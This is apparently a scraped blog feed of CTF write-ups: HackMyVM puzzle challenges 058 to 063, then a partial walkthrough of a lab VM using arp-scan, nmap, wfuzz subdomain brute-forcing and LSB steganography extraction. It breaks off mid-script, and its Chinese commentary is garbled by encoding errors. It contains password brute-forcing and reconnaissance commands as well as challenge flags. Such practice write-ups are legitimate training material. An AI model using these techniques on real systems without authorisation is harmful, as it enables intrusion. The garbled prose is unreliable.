‚îî‚îÄ$ python stegsnowbruteforcer.py --file ../063.txt --wordlist /usr/share/wordlists/rockyou.txt --keyword HMV{ --output results.txt 

***********************************************************
*                                                         *
*         Stegsnow Password Brute-Force Attack            *
*                    made by Assa                         *
*     https://github.com/Assa228/StegsnowBruteForcer      *
*                                                         *
***********************************************************

  0%|                                | 480/14344392 [00:12&lt;23:06:27, 172.43it/s]
Keyword 'HMV{' found with the password: letmein
Here is the decoded message:
HMV{wh1t3_sp4c3_st3g_15_fu/\/}
  0%|                               | 6394/14344392 [00:19&lt;12:25:36, 320.50it/s]^C

```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20063.html</guid><pubDate>Fri, 18 Jul 2025 14:57:48 +0000</pubDate></item><item><title>Challenge 062</title><link>https://7r1UMPHK.github.io/post/Challenge%20062.html</link><description>![image-20250718220920924](https://7r1umphk.github.io/image/20250718220921171.webp)

https://hackmyvm.eu/challenges/challenge.php?c=062

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la 062.zip 
-rwxr-xr-x 1 kali kali 2375882  7Êúà18Êó• 10:10 062.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 062.zip     

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2375882 bytes (2321 KiB)

Extracting archive: 062.zip
--
Path = 062.zip
Type = zip
Physical Size = 2375882

Everything is Ok

Size:       2377257
Compressed: 2375882
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la        
ÊÄªËÆ° 4655
drwxr-xr-x 1 kali kali    4096  7Êúà18Êó• 10:10 .
drwxr-xr-x 1 kali kali    8192  7Êúà17Êó• 23:37 ..
-rwxr-xr-x 1 kali kali 2377257 2023Âπ¥ 1Êúà10Êó• 062.png
-rwxr-xr-x 1 kali kali 2375882  7Êúà18Êó• 10:10 062.zip
                                     
```

![image-20250718221100328](https://7r1umphk.github.io/image/20250718221101047.webp)

Áé∞Âú®ÁúãÂà∞È£ûÊú∫Â∞±ÁÉ¶Ôºå‰πãÂâçËß£ÈÇ£‰∏™Êú∫Âú∫ÈÇ£‰∏™Âà∞Áé∞Âú®ÈÉΩÊ≤°ÊêûÊòéÁôΩ

ÁúãÂà∞Êúâ‰∏Ä‰∏™Êù°Á†ÅËøòÊòØÂÆåÊï¥ÁöÑÔºåÊâæ‰∏™Êù°Á†ÅÊâ´ÊèèÔºåÊâ´Êâ´

https://www.1txm.com/barcodeDecode

![image-20250718221717097](https://7r1umphk.github.io/image/20250718221717466.webp)

```
HMV{1_l0v3_c0d3_128}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20062.html</guid><pubDate>Fri, 18 Jul 2025 14:57:36 +0000</pubDate></item><item><title>Challenge 061</title><link>https://7r1UMPHK.github.io/post/Challenge%20061.html</link><description>![image-20250718215535991](https://7r1umphk.github.io/image/20250718215536221.webp)

https://hackmyvm.eu/challenges/challenge.php?c=061

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la 061.zip 
-rwxr-xr-x 1 kali kali 435  7Êúà18Êó• 09:55 061.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 06*.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 435 bytes (1 KiB)

Extracting archive: 061.zip
--
Path = 061.zip
Type = zip
Physical Size = 435

Everything is Ok

Size:       430
Compressed: 435
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al        
ÊÄªËÆ° 13
drwxr-xr-x 1 kali kali 4096  7Êúà18Êó• 09:56 .
drwxr-xr-x 1 kali kali 8192  7Êúà17Êó• 23:37 ..
-rwxr-xr-x 1 kali kali  430 2024Âπ¥ 1Êúà24Êó• 061.txt
-rwxr-xr-x 1 kali kali  435  7Êúà18Êó• 09:55 061.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 061.txt
UEsDBC0AAgAIALySN1jMnd4u//////////8BABQALQEAEAA4BQAAAAAAAHgAAAAAAAAArVPJDcAg
DFvJ3n+58mih5G6KhGQBVi7HAAmMsyEWciAh/ieP877xnnfIeBmfimfW4cZf/2HdL4z7S3hZXlUn
a3Og5v+KW9XXzY/ePGW8sp7s7Ve1Dq+vbG9P6WDse+yH4vwMf7byez5HU192dT3kl89+pdvfzb8A
UEsBAh4DLQACAAgAvJI3WMyd3i54AAAAOAUAAAEAAAAAAAAAAQAAAIARAAAAAC1QSwYGLAAAAAAA
AAAeAy0AAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAALwAAAAAAAACrAAAAAAAAAFBLBgcAAAAA2gAA
AAAAAAABAAAAUEsFBgAAAAABAAEALwAAAKsAAAAAAA==
                                    
```

https://gchq.github.io/CyberChef/

![image-20250718215743580](https://7r1umphk.github.io/image/20250718215743873.webp)

PKZIPÂéãÁº©Êñá‰ª∂

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 061b.zip -oa           

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la a      
ÊÄªËÆ° 6
-rwxr-xr-x 1 kali kali 1336 2024Âπ¥ 1Êúà23Êó• -
drwxr-xr-x 1 kali kali    0  7Êúà18Êó• 10:01 .
drwxr-xr-x 1 kali kali 4096  7Êúà18Êó• 10:01 ..
```

Á•û‰∫∫

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat a/-                   
0011001000110010001100000011000001110100001100100011001000110001001100100111010000110001001100000011000000110001001100100111010000110001001100010011000100110010001100000111010000110001001100000011000000110000001100010111010000110010001100100011001000110010011101000011001000110010001100000011001001110100001100100011000000110000001100010111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011000100110000001100010011000100110010011101000011001000110010001100000011000001110100001100010011001000110001001100000111010000110010001100100011001000110010011101000011000100110010001100100011000001110100001100010011000000110001001100010011001001110100001100010011000000110000001100100011001001110100001100010011001000110001001100000111010000110001001100000011000000110001001100010111010000110001001100000011000100110001001100100111010000110010001100010011000100110001011101000011000100110001001100000011001000110000011101000011000100110010001100100011000101110100001100100011000100110001001100010111010000110010001100100011000100110000011101000011000100110010001100100011000001110100001100100011000100110001001100100111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011001000110000001100000011000101110100001100010011000100110001001100100011001001110100                                                         
```

![image-20250718220535012](https://7r1umphk.github.io/image/20250718220535314.webp)

Ëß£Âá∫‰∏Ä‰∏™‰∏âËøõÂà∂Ôºåt‰∏∫ÂàÜÈöîÁ¨¶

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat a.py 
s = '2200t2212t10012t11120t10001t2222t2202t2001t10112t1211t10112t2200t1210t2222t1220t10112t10022t1210t10011t10112t2111t11020t1221t2111t2210t1220t2112t10112t1211t2001t11122t'
nums = s.strip('t').split('t')
flag = ''.join(chr(int(n, 3)) for n in nums)
print(flag)
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 $_               
HMV{RPJ7_1_H0P3_Y0U_Cr4CK3D_17}
                          
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20061.html</guid><pubDate>Fri, 18 Jul 2025 14:57:26 +0000</pubDate></item><item><title>Challenge 060</title><link>https://7r1UMPHK.github.io/post/Challenge%20060.html</link><description>![image-20250718215028063](https://7r1umphk.github.io/image/20250718215056695.webp)

https://hackmyvm.eu/challenges/challenge.php?c=060

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la 060.zip 
-rwxr-xr-x 1 kali kali 5795  7Êúà18Êó• 09:51 060.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 060.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 5795 bytes (6 KiB)

Extracting archive: 060.zip
--
Path = 060.zip
Type = zip
Physical Size = 5795

Everything is Ok

Size:       23103
Compressed: 5795
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la        
ÊÄªËÆ° 1424
drwxr-xr-x 1 kali kali    4096  7Êúà18Êó• 09:51 .
drwxr-xr-x 1 kali kali    8192  7Êúà17Êó• 23:37 ..
...
-rwxr-xr-x 1 kali kali   23103 2024Âπ¥ 1Êúà22Êó• 060.txt
-rwxr-xr-x 1 kali kali    5795  7Êúà18Êó• 09:51 060.zip
...
    
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ head -n 10 060.txt
G90
G20
G17 G64 P0.001 M3 S3000
F5.00
G0 Z0.2500
G0 X0.1329 Y0.0000
G1 Z-0.0010 F0.10
G1 X0.1329 Y0.0000F5.00
G1 Y0.0946
G1 X0.0536
```

G-code Â≠¶Êú∫Â∫äÁöÑÂ∫îËØ•ÂæàÁÜüÔºåÂìàÂìàÂìà

https://ncviewer.com/

![image-20250718215438894](https://7r1umphk.github.io/image/20250718215439411.webp)

```
HMV{engraving_a_trophy_for_Kerszi}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20060.html</guid><pubDate>Fri, 18 Jul 2025 14:57:14 +0000</pubDate></item><item><title>Challenge 059</title><link>https://7r1UMPHK.github.io/post/Challenge%20059.html</link><description>![image-20250718211403641](https://7r1umphk.github.io/image/20250718211403851.webp)

https://hackmyvm.eu/challenges/challenge.php?c=059

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 059.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1340043 bytes (1309 KiB)

Extracting archive: 059.zip
--
Path = 059.zip
Type = zip
Physical Size = 1340043
Comment = 67f1eeaca308318257ec4f222b4315741738d456

Everything is Ok

Folders: 22
Files: 120
Size:       3143617
Compressed: 1340043
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 1395
drwxr-xr-x 1 kali kali    4096  7Êúà18Êó• 09:14 .
drwxr-xr-x 1 kali kali    8192  7Êúà17Êó• 23:37 ..
-rwxr-xr-x 1 kali kali   35450  7Êúà18Êó• 09:05 058.zip
-rwxr-xr-x 1 kali kali 1340043  7Êúà18Êó• 09:14 059.zip
-rwxr-xr-x 1 kali kali   35280 2023Âπ¥12Êúà28Êó• challenge.png
drwxr-xr-x 1 kali kali    4096 2024Âπ¥ 1Êúà 4Êó• h1ker-main
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd h1ker-main 
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/h1ker-main]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 75
drwxr-xr-x 1 kali kali  4096 2024Âπ¥ 1Êúà 4Êó• .
drwxr-xr-x 1 kali kali  4096  7Êúà18Êó• 09:14 ..
drwxr-xr-x 1 kali kali  4096 2024Âπ¥ 1Êúà 4Êó• admin
-rwxr-xr-x 1 kali kali  8554 2024Âπ¥ 1Êúà 4Êó• aerocms.sql
-rwxr-xr-x 1 kali kali  2411 2024Âπ¥ 1Êúà 4Êó• author_posts.php
-rwxr-xr-x 1 kali kali   100 2024Âπ¥ 1Êúà 4Êó• build_docker.sh
-rwxr-xr-x 1 kali kali  3203 2024Âπ¥ 1Êúà 4Êó• category.php
drwxr-xr-x 1 kali kali     0 2024Âπ¥ 1Êúà 4Êó• config
drwxr-xr-x 1 kali kali     0 2024Âπ¥ 1Êúà 4Êó• css
-rwxr-xr-x 1 kali kali   324 2024Âπ¥ 1Êúà 4Êó• Dockerfile
drwxr-xr-x 1 kali kali  4096 2024Âπ¥ 1Êúà 4Êó• fonts
drwxr-xr-x 1 kali kali     0 2024Âπ¥ 1Êúà 4Êó• images
drwxr-xr-x 1 kali kali  4096 2024Âπ¥ 1Êúà 4Êó• includes
-rwxr-xr-x 1 kali kali  4421 2024Âπ¥ 1Êúà 4Êó• index.php
drwxr-xr-x 1 kali kali     0 2024Âπ¥ 1Êúà 4Êó• js
-rwxr-xr-x 1 kali kali 18092 2024Âπ¥ 1Êúà 4Êó• LICENSE
-rwxr-xr-x 1 kali kali  7812 2024Âπ¥ 1Êúà 4Êó• post.php
-rwxr-xr-x 1 kali kali  1306 2024Âπ¥ 1Êúà 4Êó• README.md
-rwxr-xr-x 1 kali kali  3176 2024Âπ¥ 1Êúà 4Êó• registration.php
-rwxr-xr-x 1 kali kali   369 2024Âπ¥ 1Êúà 4Êó• run.sh
-rwxr-xr-x 1 kali kali  3039 2024Âπ¥ 1Êúà 4Êó• search.php
                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/h1ker-main]
‚îî‚îÄ$ cat README.md                                        

# H1ker
&lt;p align=center&gt;
&lt;a target='_blank' href='LICENSE' title='License: MIT'&gt;&lt;img src='https://img.shields.io/badge/License-MIT-blue.svg'&gt;&lt;/a&gt;
&lt;a target='_blank' href='AeroCMS' title='AeroCMS'&gt;&lt;img src='https://img.shields.io/badge/cms-latest-purple'&gt;&lt;/a&gt;
&lt;/p&gt;

# AeroCMS
Aero / AeroCMS is a simple and easy to use CMS (Content Management System) designed to create fast and powerful web applications. Aero is built with OOP (Object Oriented Programming) PHP which is known for fast website loading speeds, [AeroCMS](https://github.com/MegaTKC/AeroCMS).


This is a web vulnerability challenge, try to find the flag.
This challenge requires docker.

### Manual Docker image build and run
1. Install [Docker](https://www.docker.com)
2. Build the image `docker build -t h1ker .`
3. Start the container with a port of your choice by replacing 1337 `docker run --name=h1ker -d -p 1337:80 h1ker`
4. The challenge can be found in http://localhost:1337/

### Automated run
Run the following bash script to build and run the challenge `./build_docker.sh`. The challenge can be found in http://localhost:1337/

## Delete challenge
Don't forget to delete both the container and the image of the challenge after you finish:
1. Delete container `docker rm h1ker -f`
2. Delete image `docker rmi h1ker`


Have fun !
       
```

&gt; # H1ker
&gt; &lt;p align=center&gt;
&gt; &lt;a target='_blank' href='LICENSE' title='ËÆ∏ÂèØËØÅÔºöMIT'&gt;&lt;img src='https://img.shields.io/badge/License-MIT-blue.svg'&gt;&lt;/a&gt;
&gt; &lt;a target='_blank' href='AeroCMS' title='AeroCMS'&gt;&lt;img src='https://img.shields.io/badge/cms-latest-purple'&gt;&lt;/a&gt;
&gt; &lt;/p&gt;
&gt;
&gt; # AeroCMS
&gt; Aero / AeroCMS ÊòØ‰∏ÄÊ¨æÁÆÄÂçïÊòìÁî®ÁöÑ CMSÔºàÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºâÔºåÊó®Âú®ÂàõÂª∫Âø´ÈÄüÂº∫Â§ßÁöÑ Web Â∫îÁî®Á®ãÂ∫è„ÄÇAero ÈááÁî®Èù¢ÂêëÂØπË±°ÁºñÁ®ã (OOP) PHP ÊûÑÂª∫ÔºåËØ•ËØ≠Ë®Ä‰ª•Âø´ÈÄüÁöÑÁΩëÁ´ôÂä†ËΩΩÈÄüÂ∫¶ËÄåÈóªÂêçÔºå[AeroCMS](https://github.com/MegaTKC/AeroCMS)„ÄÇ
&gt;
&gt; ËøôÊòØ‰∏Ä‰∏™ Web ÊºèÊ¥ûÊåëÊàòÔºåËØ∑Â∞ùËØïÊâæÂà∞ flag„ÄÇ
&gt; Ê≠§ÊåëÊàòÈúÄË¶Å Docker ÁöÑÊîØÊåÅ„ÄÇ
&gt;
&gt; ### ÊâãÂä®ÊûÑÂª∫Âπ∂ËøêË°å Docker ÈïúÂÉè
&gt; 1. ÂÆâË£Ö [Docker](https://www.docker.com)
&gt; 2. ÊûÑÂª∫ÈïúÂÉè `docker build -t h1ker`
&gt; 3. ‰ΩøÁî®ÊÇ®ÈÄâÊã©ÁöÑÁ´ØÂè£ÂêØÂä®ÂÆπÂô®ÔºåÊñπÊ≥ïÊòØÂ∞Ü 1337 ÊõøÊç¢‰∏∫ `docker run --name=h1ker -d -p 1337:80 h1ker`
&gt; 4. ÊÇ®ÂèØ‰ª•Âú® http://localhost:1337/ ÊâæÂà∞ÊåëÊàò
&gt;
&gt; ### Ëá™Âä®ËøêË°å
&gt; ËøêË°å‰ª•‰∏ã bash ËÑöÊú¨Êù•ÊûÑÂª∫Âπ∂ËøêË°åÊåëÊàò `./build_docker.sh`„ÄÇÊÇ®ÂèØ‰ª•Âú® http://localhost:1337/ ÊâæÂà∞ÊåëÊàò
&gt;
&gt; ## Âà†Èô§ÊåëÊàò
&gt; ÂÆåÊàêÂêéÔºåËØ∑ËÆ∞ÂæóÂà†Èô§ÂÆπÂô®ÂíåÊåëÊàòÈïúÂÉèÔºö
&gt; 1. Âà†Èô§ÂÆπÂô® `docker rm h1ker -f`
&gt; 2. Âà†Èô§ÈïúÂÉè `docker rmi h1ker`
&gt;
&gt; Á•ùÊÇ®Áé©ÂæóÂºÄÂøÉÔºÅ

‰∏çÁà±ÂºÄdocker

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/h1ker-main]
‚îî‚îÄ$ grep -r 'HMV{' . 
./admin/categories.php:                            &lt;small&gt;HMV{h1kinG_1s_s0_fUn}&lt;/small&gt;
                          
```

ÂìàÂìàsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20059.html</guid><pubDate>Fri, 18 Jul 2025 14:57:03 +0000</pubDate></item><item><title>Challenge 058</title><link>https://7r1UMPHK.github.io/post/Challenge%20058.html</link><description>Â•ΩÂÉèÂ•Ω‰πÖÊ≤°ÊâìChallenge‰∫ÜÔºåÊâìÊâì

![image-20250718210310881](https://7r1UMPHK.github.io/image/20250718210319612.webp)

https://hackmyvm.eu/challenges/challenge.php?c=058

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la 058.zip      
-rwxr-xr-x 1 kali kali 35450  7Êúà18Êó• 09:05 058.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 058.zip                      

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 35450 bytes (35 KiB)

Extracting archive: 058.zip
--
Path = 058.zip
Type = zip
Physical Size = 35450

Everything is Ok

Size:       35280
Compressed: 35450
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al        
ÊÄªËÆ° 82
drwxr-xr-x 1 kali kali  4096  7Êúà18Êó• 09:05 .
drwxr-xr-x 1 kali kali  8192  7Êúà17Êó• 23:37 ..
-rwxr-xr-x 1 kali kali 35450  7Êúà18Êó• 09:05 058.zip
-rwxr-xr-x 1 kali kali 35280 2023Âπ¥12Êúà28Êó• challenge.png
```

![challenge](https://7r1UMPHK.github.io/image/20250718210626732.webp)

ÂÉèÊòØÂõæÂΩ¢Âä†ÂØÜ

https://www.dcode.fr/symbols-ciphers

ÊâæÂ∞±ÂÆå‰∫ã‰∫Ü

D'ni Numerals

Ëß£‰∏Ä‰∏ãÂØÜ

![image-20250718211005223](https://7r1UMPHK.github.io/image/20250718211005590.webp)

```
HMV{13377331}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20058.html</guid><pubDate>Fri, 18 Jul 2025 14:56:49 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_chabaidao</title><link>https://7r1UMPHK.github.io/post/nei-bu-_chabaidao.html</link><description>![image-20250717204541576](https://7r1UMPHK.github.io/image/20250717204550270.webp)

‰∏ãËΩΩÂú∞ÂùÄÔºöhttps://mega.nz/file/If9khB4Y#osVSL5SXMQSUQEicWYFZ3Q5w-lovLyamBD_kfDpuNVI

---

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ‰∏éÊúçÂä°Êé¢Êµã

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®ÂÜÖÁΩëÁéØÂ¢É‰∏≠ÔºåÊàë‰ª¨‰ΩøÁî® `arp-scan` Êù•ÂèëÁé∞Âêå‰∏ÄÁΩëÊÆµ‰∏ãÁöÑÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.192 08:00:27:d7:eb:a4       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 responded
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.192`„ÄÇ

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

Á°ÆÂÆöÁõÆÊ†á IP ÂêéÔºå‰ΩøÁî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ÂèëÁé∞ÊâÄÊúâÂºÄÊîæÁöÑ TCP Á´ØÂè£ÂèäÂÖ∂‰∏äËøêË°åÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.192
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 08:48 EDT
Nmap scan report for 192.168.205.192
Host is up (0.00019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D7:EB:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

ÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü‰∏§‰∏™Â∏∏ËßÅÁ´ØÂè£Ôºö

*   **22/tcp**: SSH ÊúçÂä°ÔºåÁî®‰∫éËøúÁ®ãÁôªÂΩï„ÄÇ
*   **80/tcp**: HTTP ÊúçÂä°ÔºåÂç≥Ê†áÂáÜ Web ÊúçÂä°„ÄÇ

# ‰∫å„ÄÅWeb Êé¢Á¥¢‰∏éÊºèÊ¥ûÂèëÁé∞

## 1. ÂüüÂêç‰∏éÂ≠êÂüüÂêçÂèëÁé∞

ËÆøÈóÆ `http://192.168.205.192` ÊòØ‰∏Ä‰∏™ÁîµÂïÜÁΩëÁ´ô„ÄÇÂ∞ùËØïÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑Âπ∂ÁôªÂΩïÂêéÔºåÂú® ‚ÄúÊàëÁöÑËÆ¢Âçï‚Äù È°µÈù¢ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ PHP Êä•Èîô‰ø°ÊÅØ„ÄÇ

![image-20250717205207123](https://7r1UMPHK.github.io/image/20250717205207346.webp)

&gt; **Warning**: Undefined array key 'role' in **/var/www/chabaidao.dsz/customer/includes/header.php** on line **35**

Ëøô‰∏™Êä•ÈîôÊ≥ÑÈú≤‰∫ÜÁΩëÁ´ôÁöÑÊ†πÁõÆÂΩïË∑ØÂæÑÔºåÂπ∂Êè≠Á§∫‰∫ÜÂÖ∂ÂüüÂêç‰∏∫ `chabaidao.dsz`„ÄÇÊàë‰ª¨Â∞ÜÊ≠§ÂüüÂêçÊ∑ªÂä†Âà∞Êú¨Âú∞ `hosts` Êñá‰ª∂‰∏≠„ÄÇ

```bash
# Âú® /etc/hosts Êñá‰ª∂‰∏≠Ê∑ªÂä†
192.168.205.192 chabaidao.dsz
```

Êé•ÁùÄÔºå‰ΩøÁî® `wfuzz` ÂØπËØ•ÂüüÂêçËøõË°åÂ≠êÂüüÂêçÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ wfuzz -c -u 'http://chabaidao.dsz/' -H 'HOST:FUZZ.chabaidao.dsz' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 764

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        610 L    1372 W     21027 Ch    'mail - mail'
...
```

ÂèëÁé∞‰∏Ä‰∏™Â≠êÂüüÂêç `mail.chabaidao.dsz`ÔºåÂêåÊ†∑Â∞ÜÂÖ∂Ê∑ªÂä†Âà∞ `hosts` Êñá‰ª∂„ÄÇ

```bash
# Êõ¥Êñ∞ /etc/hosts Êñá‰ª∂
192.168.205.192 chabaidao.dsz mail.chabaidao.dsz
```

## 2. ÈöêÂÜôÊúØÂàÜÊûê

ËÆøÈóÆ `http://mail.chabaidao.dsz/`ÔºåÈ°µÈù¢‰∏äÂè™Êúâ‰∏Ä‰∏™ÂèØ‰ª•Êí≠ÊîæÈü≥‰πêÊñá‰ª∂ `music.wav`„ÄÇ

![image-20250717205551792](https://7r1UMPHK.github.io/image/20250717205552105.webp)

ÈÄöËøáÊü•ÁúãÊ∫ê‰ª£Á†Å‰∏ãËΩΩ `music.wav` Êñá‰ª∂ÔºåÂπ∂‰∏î‰∏éÁΩëÁªú‰∏äÁöÑÂéüÊõ≤ÔºàÂàòÁëûÁê¶-‰∏§‰∏âÂè•ÔºâËøõË°å‰∫åËøõÂà∂ÊØîËæÉ (`cmp -l`)ÔºåÂèëÁé∞‰∏§‰∏™Êñá‰ª∂Âú®ËÆ∏Â§öÂ≠óËäÇ‰∏ä‰ªÖÁõ∏Â∑Æ 1„ÄÇËøôÂº∫ÁÉàÊåáÂêë‰∫Ü **ÊúÄ‰ΩéÊúâÊïà‰ΩçÔºàLSBÔºâÈöêÂÜô**„ÄÇ

&gt; **‰ªÄ‰πàÊòØ LSB ÈöêÂÜôÔºü**
&gt;
&gt; LSBÔºàLeast Significant BitÔºâÈöêÂÜôÊòØ‰∏ÄÁßçÂ∞ÜÁßòÂØÜ‰ø°ÊÅØÂµåÂÖ•Âà∞Êï∞Â≠óÂ™í‰ΩìÔºàÂ¶ÇÂõæÂÉèÊàñÈü≥È¢ëÔºâ‰∏≠ÁöÑÊäÄÊúØ„ÄÇÂÆÉÈÄöËøá‰øÆÊîπÊØè‰∏™Ê†∑Êú¨ÔºàÊàñÂÉèÁ¥†ÔºâÊï∞ÊçÆ‰∏≠‚ÄúÊúÄ‰∏çÈáçË¶Å‚ÄùÁöÑÊØîÁâπÔºàÂç≥ÊúÄ‰Ωé‰ΩçÔºâÊù•ÈöêËóè‰ø°ÊÅØ„ÄÇÁî±‰∫éËøôÁßç‰øÆÊîπÂØπÂéüÂßãÊñá‰ª∂ÁöÑÂΩ±ÂìçÊûÅÂ∞èÔºå‰∫∫ËÄ≥ÊàñËÇâÁúºÂæàÈöæÂØüÂ§ú„ÄÇ

Êàë‰ª¨ÁºñÂÜô‰∏Ä‰∏™ Python ËÑöÊú¨Êù•ÊèêÂèñ `music.wav` Êï∞ÊçÆÈÉ®ÂàÜÊâÄÊúâÂ≠óËäÇÁöÑÊúÄ‰ΩéÊúâÊïà‰ΩçÔºåÂπ∂Â∞ÜÂÆÉ‰ª¨ÈáçÊñ∞ÁªÑÂêàÊàê‰∏Ä‰∏™Êñá‰ª∂„ÄÇ

```python
import sys

def ext(fin, fout):
    try:
        with open(fin, 'rb') as f:
            data = f.read()
        
        bits = [str(b &amp; 1) for b in data[44:]]
        
        b_arr = bytearray()
        for i in range(0, len(bits) - len(bits) % 8, 8):
            b_arr.append(int(''.join(bits[i:i+8]), 2))
            
        with open(fout, 'wb') as f:
            f.write(b_arr)
            
